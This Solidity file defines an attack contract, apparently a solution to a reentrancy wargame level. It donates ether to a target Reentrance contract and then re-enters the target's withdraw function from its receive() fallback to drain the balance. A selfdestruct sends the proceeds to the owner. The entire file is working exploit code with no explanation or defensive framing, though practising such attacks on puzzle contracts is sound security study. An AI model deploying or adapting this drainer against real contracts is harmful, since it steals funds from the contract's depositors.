// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Reentrance} from "./Reentrance.sol";

contract AttackReentrance is Ownable {
    Reentrance reentranceContract;

    constructor(address _reentranceAddress) Ownable(msg.sender) {
        reentranceContract = Reentrance(payable(_reentranceAddress));
    }

    function withdraw() internal {
        (bool sent,) = address(reentranceContract).call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
    }

    function attack() external payable onlyOwner {
        reentranceContract.donate{value: msg.value, gas: 120000}(address(this));
        withdraw();
    }

    receive() external payable {
        withdraw();
    }

    function finish() external onlyOwner {
        selfdestruct(payable(owner())); // selfdestruct is deprecated
    }
}
